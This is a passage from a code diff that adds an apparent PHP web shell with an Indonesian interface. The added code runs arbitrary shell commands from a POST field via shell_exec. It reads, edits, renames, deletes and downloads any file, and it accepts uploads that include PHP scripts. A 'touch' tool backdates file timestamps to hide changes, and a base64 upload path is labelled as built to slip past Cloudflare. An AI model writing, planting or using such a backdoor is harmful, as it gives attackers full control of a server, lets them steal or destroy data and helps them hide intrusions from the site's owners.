+        echo "   ───────────────────────────────────────\n";
+        
+        if (!file_exists($file_path)) {
+            echo "   ❌ Path tidak ditemukan!\n";
+        } else {
+            try {
+                $datetime = new DateTime($time_input);
+                $timestamp = $datetime->getTimestamp();
+                
+                if (touch($file_path, $timestamp)) {
+                    $new_mtime = date('Y-m-d H:i:s', filemtime($file_path));
+                    echo "   ✅ BERHASIL!\n";
+                    echo "   📅 Tanggal baru: " . $new_mtime . "\n";
+                    echo "   📊 Format: " . date('l, d F Y H:i:s', $timestamp) . "\n";
+                    echo "   📂 Tipe: " . $type_label . "\n";
+                } else {
+                    echo "   ❌ Gagal mengubah timestamp!\n";
+                    echo "   💡 Cek permission: " . ($is_dir ? 'folder' : 'file') . " harus writable\n";
+                }
+            } catch (Exception $e) {
+                echo "   ❌ Format tanggal salah!\n";
+                echo "   💡 Gunakan format: YYYY-MM-DDTHH:MM (contoh: 2025-04-05T02:59)\n";
+            }
+        }
+        echo "\n";
+    }
+    
+    // ============================================================
+    // SAVE EDIT FILE
+    // ============================================================
+    if (isset($_POST['save_edit']) && isset($_POST['edit_file_path']) && isset($_POST['edit_file_content'])) {
+        $file_path = $_POST['edit_file_path'];
+        $file_content = $_POST['edit_file_content'];
+        
+        echo "\n📝 Menyimpan: " . htmlspecialchars(basename($file_path)) . "\n";
+        echo "   ───────────────────────────────────────\n";
+        
+        if (!file_exists($file_path)) {
+            echo "   ❌ File tidak ditemukan!\n";
+        } elseif (!is_writable($file_path)) {
+            echo "   ❌ Permission denied!\n";
+            echo "   💡 Jalankan: chmod 666 " . htmlspecialchars(basename($file_path)) . "\n";
+        } else {
+            $bytes = file_put_contents($file_path, $file_content);
+            if ($bytes !== false) {
+                echo "   ✅ BERHASIL! " . number_format($bytes) . " bytes tersimpan\n";
+                echo "   📅 " . date('Y-m-d H:i:s') . "\n";
+            } else {
+                echo "   ❌ Gagal menyimpan! (unknown error)\n";
+                echo "   💡 Cek: apakah disk penuh?\n";
+            }
+        }
+        echo "\n";
+    }
+    
+    // ============================================================
+    // RENAME
+    // ============================================================
+    if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+        $old = $_POST['old_name'];
+        $new_dir = dirname($old) . '/' . basename($_POST['new_name']);
+        if (file_exists($old)) {
+            if (rename($old, $new_dir)) {
+                echo "✅ Berhasil rename: " . htmlspecialchars(basename($old)) . " → " . htmlspecialchars(basename($new_dir)) . "\n";
+            } else {
+                echo "❌ Gagal rename\n";
+            }
+        }
+    }
+    
+    // ============================================================
+    // DELETE
+    // ============================================================
+    if (isset($_GET['delete'])) {
+        $target = $_GET['delete'];
+        if (file_exists($target)) {
+            if (is_dir($target)) {
+                if (hapusFolder($target)) echo "✅ Folder berhasil dihapus\n";
+                else echo "❌ Gagal hapus folder\n";
+            } else {
+                if (unlink($target)) echo "✅ File berhasil dihapus\n";
+                else echo "❌ Gagal hapus file\n";
+            }
+        }
+    }
+    
+    // ============================================================
+    // UPLOAD BIASA
+    // ============================================================
+    if (isset($_POST['upload'])) {
+        $upload_path = $_POST['upload_path'];
+        
+        if (isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
+            $file_name = basename($_FILES['uploaded_file']['name']);
+            $file_tmp = $_FILES['uploaded_file']['tmp_name'];
+            $file_size = $_FILES['uploaded_file']['size'];
+            $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
+            
+            $allowed = ['jpg','jpeg','png','gif','webp','pdf','txt','zip','rar','7z','doc','docx','xls','xlsx','ppt','pptx','mp4','mp3','avi','mkv','php','html','css','js','json','xml','sql','md','csv','yml','yaml','ini','log'];
+            
+            if (!in_array($file_ext, $allowed)) {
+                echo "❌ Tipe file tidak diizinkan: " . htmlspecialchars($file_ext) . "\n";
+            } elseif ($file_size > 104857600) {
+                echo "❌ File terlalu besar: " . number_format($file_size) . " bytes (max 100MB)\n";
+            } else {
+                $file_name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $file_name);
+                $target = rtrim($upload_path, '/') . '/' . $file_name;
+                
+                if (file_exists($target)) {
+                    echo "⚠️ File sudah ada: " . htmlspecialchars($file_name) . "\n";
+                } else {
+                    if (move_uploaded_file($file_tmp, $target)) {
+                        chmod($target, 0644);
+                        echo "✅ Upload berhasil: " . htmlspecialchars($file_name) . "\n";
+                        echo "📊 Size: " . number_format($file_size) . " bytes\n";
+                    } else {
+                        echo "❌ Upload gagal!\n";
+                    }
+                }
+            }
+        } else {
+            $error = $_FILES['uploaded_file']['error'] ?? 'Unknown';
+            $errors = [
+                UPLOAD_ERR_INI_SIZE => 'File melebihi upload_max_filesize',
+                UPLOAD_ERR_FORM_SIZE => 'File melebihi MAX_FILE_SIZE',
+                UPLOAD_ERR_PARTIAL => 'File hanya terupload sebagian',
+                UPLOAD_ERR_NO_FILE => 'Tidak ada file yang diupload',
+                UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
+                UPLOAD_ERR_CANT_WRITE => 'Gagal menulis file ke disk',
+                UPLOAD_ERR_EXTENSION => 'Upload dihentikan oleh extension PHP'
+            ];
+            echo "❌ Upload error: " . ($errors[$error] ?? "Unknown error ($error)") . "\n";
+        }
+    }
+    
+    // ============================================================
+    // BUAT FOLDER
+    // ============================================================
+    if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
+        $path = rtrim($_POST['create_path'], '/') . '/' . basename($_POST['folder_name']);
+        if (mkdir($path, 0755)) {
+            echo "✅ Folder berhasil dibuat: " . htmlspecialchars(basename($path)) . "\n";
+        } else {
+            echo "❌ Gagal buat folder\n";
+        }
+    }
+    
+    // ============================================================
+    // BUAT FILE
+    // ============================================================
+    if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
+        $file_path = rtrim($_POST['create_file_path'], '/') . '/' . basename($_POST['file_name']);
+        $template = isset($_POST['file_template']) ? $_POST['file_template'] : 'empty';
+        $content = getFileTemplate($template, $file_path);
+        
+        echo "\n📄 Membuat file: " . htmlspecialchars(basename($file_path)) . "\n";
+        echo "   ───────────────────────────────────────\n";
+        
+        if (file_exists($file_path)) {
+            echo "   ⚠️  File sudah ada! Gunakan nama lain.\n";
+        } else {
+            if (file_put_contents($file_path, $content) !== false) {
+                echo "   ✅ BERHASIL!\n";
+                echo "   📂 Lokasi: " . htmlspecialchars(dirname($file_path)) . "\n";
+                echo "   📝 Template: " . htmlspecialchars($template) . "\n";
+                echo "   📊 Size: " . number_format(strlen($content)) . " bytes\n";
+                echo "   📅 " . date('Y-m-d H:i:s') . "\n";
+            } else {
+                echo "   ❌ Gagal membuat file!\n";
+                echo "   💡 Cek permission direktori\n";
+            }
+        }
+        echo "\n";
+    }
+    
+    // ============================================================
+    // RUN COMMAND
+    // ============================================================
+    if (isset($_POST['run_command']) && !empty($_POST['command'])) {
+        $cmd_path = isset($_POST['cmd_path']) ? $_POST['cmd_path'] : getcwd();
+        $command = $_POST['command'];
+        
+        if (!function_exists('shell_exec')) {
+            echo "\n❌ ERROR: shell_exec() tidak aktif di server ini.\n";
+        } else {
+            $full_cmd = 'cd ' . escapeshellarg($cmd_path) . ' 2>&1 && ' . $command . ' 2>&1';
+            $output = shell_exec($full_cmd);
+            
+            echo "\n┌─[" . htmlspecialchars($cmd_path) . "]\n";
+            echo "└─$ " . htmlspecialchars($command) . "\n";
+            echo str_repeat('─', 40) . "\n";
+            
+            if ($output === null || $output === '') {
+                echo "⚡ Tidak ada output\n";
+            } else {
+                if (stripos($output, 'error') !== false || 
+                    stripos($output, 'not found') !== false ||
+                    stripos($output, 'permission denied') !== false) {
+                    echo "⚠️  " . htmlspecialchars($output);
+                } else {
+                    echo htmlspecialchars($output);
+                }
+            }
+        }
+    }
+    
+    // ============================================================
+    // TAMPILKAN ISI DIREKTORI
+    // ============================================================
+    echo "\n📁 " . htmlspecialchars($current_path) . "\n";
+    echo str_repeat('─', 55) . "\n";
+    
+    if (is_dir($current_path)) {
+        $items = scandir($current_path);
+        $dirs = [];
+        $files = [];
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+            $full = rtrim($current_path, '/') . '/' . $item;
+            if (is_dir($full)) $dirs[] = $item;
+            else $files[] = $item;
+        }
+        sort($dirs);
+        sort($files);
+        $all = array_merge($dirs, $files);
+        
+        foreach ($all as $item) {
+            $full = rtrim($current_path, '/') . '/' . $item;
+            $isDir = is_dir($full);
+            $icon = $isDir ? '📁' : '📄';
+            $icon_class = $isDir ? 'folder-icon' : 'file-icon';
+            $size = $isDir ? '' : ' (' . number_format(filesize($full)) . ' B)';
+            
+            $mtime = filemtime($full);
+            $mtime_str = date('Y-m-d H:i:s', $mtime);
+            
+            echo "<span class='$icon_class'>$icon</span> " . htmlspecialchars($item) . $size;
+            echo " <span class='file-modified'><span class='label'>🕐</span> <span class='time'>" . $mtime_str . "</span></span>";
+            
+            echo " [<a href='?path=" . urlencode($full) . "' style='color:#66d9ff;'>buka</a>]";
+            
+            if (!$isDir) {
+                echo " [<a href='?path=" . urlencode($current_path) . "&edit=" . urlencode($full) . "' style='color:#ffd43b;'>edit</a>]";
+            }
+            
+            echo " [<a href='#' class='rename-link' onclick='showRename(\"" . htmlspecialchars($full) . "\", \"" . md5($full) . "\")'>rename</a>]";
+            echo " [<a href='?delete=" . urlencode($full) . "&path=" . urlencode($current_path) . "' class='delete-link' onclick='return confirm(\"Hapus $item?\")'>hapus</a>]";
+            echo " [<a href='#' class='touch-link' onclick='showTouch(\"" . htmlspecialchars($full) . "\", \"" . md5($full) . "\", \"" . $mtime . "\")'>touch</a>]";
+            
+            if (!$isDir) {
+                echo " [<a href='?download=" . urlencode($full) . "' class='download-link'>download</a>]";
+            }
+            
+            echo "\n";
+            
+            echo "<div id='rename-form-" . md5($full) . "' class='rename-form'>";
+            echo "<form method='POST' action=''>";
+            echo "<input type='hidden' name='old_name' value='" . htmlspecialchars($full) . "' />";
+            echo "<input type='text' name='new_name' value='" . htmlspecialchars($item) . "' />";
+            echo "<button type='submit' name='rename'>Rename</button>";
+            echo "<button type='button' onclick='hideRename(\"" . md5($full) . "\")'>Batal</button>";
+            echo "</form>";
+            echo "</div>";
+            
+            $type_label = $isDir ? 'Folder' : 'File';
+            echo "<div id='touch-form-" . md5($full) . "' class='touch-form-container'>";
+            echo "<div class='info-line'>";
+            echo "📅 <strong>Touch $type_label:</strong> " . htmlspecialchars($item);
+            echo " | Saat ini: <span class='current-time'>" . $mtime_str . "</span>";
+            if ($isDir) {
+                echo " <span style='color:#ffd43b;font-size:10px;'>(timestamp folder)</span>";
+            }
+            echo "</div>";
+            echo "<form method='POST' action='' style='display:flex;flex-wrap:wrap;gap:5px;'>";
+            echo "<input type='hidden' name='touch_path' value='" . htmlspecialchars($full) . "' />";
+            echo "<input type='datetime-local' name='touch_time' value='" . date('Y-m-d\TH:i', $mtime) . "' style='flex:1;min-width:200px;' />";
+            echo "<button type='submit' name='touch_file' class='submit-button' style='background:#ff922b;padding:5px 15px;'>";
+            echo "<i class='fas fa-clock'></i> Ubah Waktu";
+            echo "</button>";
+            echo "<button type='button' onclick='hideTouch(\"" . md5($full) . "\")' class='submit-button' style='background:#666;padding:5px 15px;'>Batal</button>";
+            echo "</form>";
+            echo "<div style='color:#888;font-size:10px;margin-top:5px;'>";
+            echo "💡 Format: YYYY-MM-DD HH:MM (contoh: 2025-04-05 02:59)";
+            echo "</div>";
+            echo "</div>";
+        }
+        
+    } elseif (file_exists($current_path)) {
+        echo "\n📄 " . htmlspecialchars(basename($current_path)) . "\n";
+        echo str_repeat('─', 55) . "\n";
+        
+        $ext = strtolower(pathinfo($current_path, PATHINFO_EXTENSION));
+        $images = ['jpg','jpeg','png','gif','webp','bmp','svg','ico'];
+        $code_exts = ['php','html','htm','css','js','txt','json','xml','sql','py','rb','go','java','c','cpp','h','sh','bat','md','yaml','yml'];
+        
+        if (in_array($ext, $images)) {
+            echo "<img src='" . htmlspecialchars($current_path) . "' style='max-width:100%;max-height:350px;border-radius:5px;' />\n";
+        } elseif (in_array($ext, $code_exts)) {
+            $content = file_get_contents($current_path);
+            if ($content === false) {
+                echo "❌ Gagal membaca file\n";
+            } else {
+                echo "<div style='background:#0a0a0a;padding:12px;border-radius:5px;font-family:monospace;font-size:12px;max-height:400px;overflow:auto;border:1px solid #2a2a2a;'>";
+                echo htmlspecialchars($content);
+                echo "</div>";
+            }
+        } else {
+            $content = file_get_contents($current_path);
+            if ($content === false) {
+                echo "❌ Gagal membaca file (mungkin binary)\n";
+                echo "📊 Size: " . number_format(filesize($current_path)) . " B\n";
+            } else {
+                if (mb_detect_encoding($content, null, true)) {
+                    echo htmlspecialchars($content);
+                } else {
+                    echo "📊 Binary file - " . number_format(filesize($current_path)) . " B\n";
+                    echo "🔍 Preview: " . substr(bin2hex(substr($content, 0, 50)), 0, 100) . "...\n";
+                }
+            }
+        }
+        
+        $mtime = filemtime($current_path);
+        echo "\n🕐 Modified: " . date('Y-m-d H:i:s', $mtime) . "\n";
+        
+        echo "\n[<a href='?delete=" . urlencode($current_path) . "&path=" . urlencode(dirname($current_path)) . "' class='delete-link' onclick='return confirm(\"Hapus?\")'>Hapus</a>]";
+        echo " [<a href='?path=" . urlencode(dirname($current_path)) . "&edit=" . urlencode($current_path) . "' style='color:#ffd43b;'>Edit</a>]";
+        echo " [<a href='#' class='rename-link' onclick='showRename(\"" . htmlspecialchars($current_path) . "\", \"file\")'>Rename</a>]";
+        echo " [<a href='#' class='touch-link' onclick='showTouch(\"" . htmlspecialchars($current_path) . "\", \"file\", \"" . $mtime . "\")'>Touch</a>]";
+        echo " [<a href='?download=" . urlencode($current_path) . "' class='download-link'>Download</a>]\n";
+        
+        echo "<div id='rename-form-file' class='rename-form'>";
+        echo "<form method='POST' action=''>";
+        echo "<input type='hidden' name='old_name' value='" . htmlspecialchars($current_path) . "' />";
+        echo "<input type='text' name='new_name' value='" . htmlspecialchars(basename($current_path)) . "' />";
+        echo "<button type='submit' name='rename'>Rename</button>";
+        echo "<button type='button' onclick='hideRename(\"file\")'>Batal</button>";
+        echo "</form>";
+        echo "</div>";
+        
+        echo "<div id='touch-form-file' class='touch-form-container'>";
+        echo "<div class='info-line'>";
+        echo "📅 <strong>Touch File:</strong> " . htmlspecialchars(basename($current_path));
+        echo " | Saat ini: <span class='current-time'>" . date('Y-m-d H:i:s', $mtime) . "</span>";
+        echo "</div>";
+        echo "<form method='POST' action='' style='display:flex;flex-wrap:wrap;gap:5px;'>";
+        echo "<input type='hidden' name='touch_path' value='" . htmlspecialchars($current_path) . "' />";
+        echo "<input type='datetime-local' name='touch_time' value='" . date('Y-m-d\TH:i', $mtime) . "' style='flex:1;min-width:200px;' />";
+        echo "<button type='submit' name='touch_file' class='submit-button' style='background:#ff922b;padding:5px 15px;'>";
+        echo "<i class='fas fa-clock'></i> Ubah Waktu";
+        echo "</button>";
+        echo "<button type='button' onclick='hideTouch(\"file\")' class='submit-button' style='background:#666;padding:5px 15px;'>Batal</button>";
+        echo "</form>";
+        echo "<div style='color:#888;font-size:10px;margin-top:5px;'>";
+        echo "💡 Format: YYYY-MM-DD HH:MM (contoh: 2025-04-05 02:59)";
+        echo "</div>";
+        echo "</div>";
+    } else {
+        echo "❌ Path tidak ditemukan: " . htmlspecialchars($current_path) . "\n";
+    }
+    ?>
+    </pre>
+    
+    <div class="footer-info">
+        👻 PHP <?php echo phpversion(); ?> | <?php echo php_uname('s'); ?>
+        <?php if (!empty($edit_file)): ?>
+        | <span style="color:#ffd43b;"><i class="fas fa-edit"></i> Editing: <?php echo htmlspecialchars(basename($edit_file)); ?></span>
+        <?php endif; ?>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// JAVASCRIPT FUNGSI
+// ============================================================
+
+function toggleForm(id) {
+    var el = document.getElementById(id);
+    if (el.style.display === 'none' || el.style.display === '') {
+        el.style.display = 'block';
+        setTimeout(function() {
+            el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 100);
+    } else {
+        el.style.display = 'none';
+    }
+}
+
+function showRename(path, id) {
+    document.querySelectorAll('.rename-form').forEach(function(f) {
+        f.style.display = 'none';
+    });
+    var form = document.getElementById('rename-form-' + id);
+    if (form) {
+        form.style.display = 'block';
+        var inp = form.querySelector('input[name="new_name"]');
+        if (inp) { inp.focus(); inp.select(); }
+    }
+}
+
+function hideRename(id) {
+    var form = document.getElementById('rename-form-' + id);
+    if (form) form.style.display = 'none';
+}
+
+function showTouch(path, id, currentTime) {
+    document.querySelectorAll('.touch-form-container').forEach(function(f) {
+        f.style.display = 'none';
+    });
+    var form = document.getElementById('touch-form-' + id);
+    if (form) {
+        form.style.display = 'block';
+        setTimeout(function() {
+            form.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 200);
+        
+        var inp = form.querySelector('input[name="touch_time"]');
+        if (inp) {
+            var date = new Date(currentTime * 1000);
+            var year = date.getFullYear();
+            var month = String(date.getMonth() + 1).padStart(2, '0');
+            var day = String(date.getDate()).padStart(2, '0');
+            var hours = String(date.getHours()).padStart(2, '0');
+            var minutes = String(date.getMinutes()).padStart(2, '0');
+            inp.value = year + '-' + month + '-' + day + 'T' + hours + ':' + minutes;
+            inp.focus();
+        }
+    }
+}
+
+function hideTouch(id) {
+    var form = document.getElementById('touch-form-' + id);
+    if (form) form.style.display = 'none';
+}
+
+// ============================================================
+// BASE64 UPLOAD - KHUSUS LOLOS CLOUDFLARE
+// ============================================================
+function convertAndUploadBase64() {
+    var fileInput = document.getElementById('base64FileInput');
+    var file = fileInput.files[0];
+    
+    if (!file) {
+        document.getElementById('base64Status').innerHTML = '⚠️ Pilih file terlebih dahulu!';
+        document.getElementById('base64Status').style.color = '#ff6b6b';
+        return;
+    }
+    
+    // Max 50MB untuk Base64 (karena ukuran jadi lebih besar)
+    if (file.size > 50 * 1024 * 1024) {
+        document.getElementById('base64Status').innerHTML = '❌ File terlalu besar! Maksimal 50MB untuk Base64';
+        document.getElementById('base64Status').style.color = '#ff6b6b';
+        return;
+    }
+    
+    var filename = document.getElementById('base64Filename').value;
+    if (!filename) {
+        filename = file.name;
+        document.getElementById('base64Filename').value = filename;
+    }
+    
+    var status = document.getElementById('base64Status');
+    var progress = document.getElementById('base64Progress');
+    var progressBar = document.getElementById('base64ProgressBar');
+    
+    status.innerHTML = '🔄 Mengkonversi file ke Base64...';
+    status.style.color = '#ffd43b';
+    progress.style.display = 'block';
+    progressBar.style.width = '0%';
+    
+    var reader = new FileReader();
+    
+    reader.onprogress = function(e) {
+        if (e.lengthComputable) {
+            var percent = Math.round((e.loaded / e.total) * 100);
+            progressBar.style.width = percent + '%';
+            status.innerHTML = '🔄 Membaca file: ' + percent + '%';
+        }
+    };
+    
+    reader.onload = function(e) {
+        progressBar.style.width = '100%';
+        status.innerHTML = '📤 Mengirim data Base64...';
+        
+        // Ambil data Base64 (hilangkan prefix)
+        var base64Data = e.target.result.split(',')[1];
+        
+        // Kirim via form
+        document.getElementById('base64Data').value = base64Data;
+        document.getElementById('base64UploadForm').submit();
+    };
+    
+    reader.onerror = function() {
+        status.innerHTML = '❌ Gagal membaca file!';
+        status.style.color = '#ff6b6b';
+        progress.style.display = 'none';
+    };
+    
+    // Baca file sebagai Data URL (Base64)
+    reader.readAsDataURL(file);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    var urlParams = new URLSearchParams(window.location.search);
+    var editFile = urlParams.get('edit');
+    if (editFile) {
+        var form = document.getElementById('edit-form');
+        if (form) {
+            form.style.display = 'block';
+            setTimeout(function() {
+                form.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 400);
+        }
+    }
+    
+    // Auto-fill filename when file selected
+    document.getElementById('base64FileInput').addEventListener('change', function() {
+        var filename = document.getElementById('base64Filename');
+        if (!filename.value) {
+            filename.value = this.files[0] ? this.files[0].name : '';
+        }
+        var status = document.getElementById('base64Status');
+        if (this.files[0]) {
+            status.innerHTML = '📎 File siap: ' + this.files[0].name + ' (' + 
+                (this.files[0].size / 1024).toFixed(1) + ' KB)';
+            status.style.color = '#51cf66';
+        }
+    });
+});
+
+document.addEventListener('keydown', function(e) {
+    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+        var form = document.querySelector('form button[name="save_edit"]');
+        if (form) {
+            e.preventDefault();
+            form.click();
+        }
+    }
+});
+</script>
+</body>
+</html>
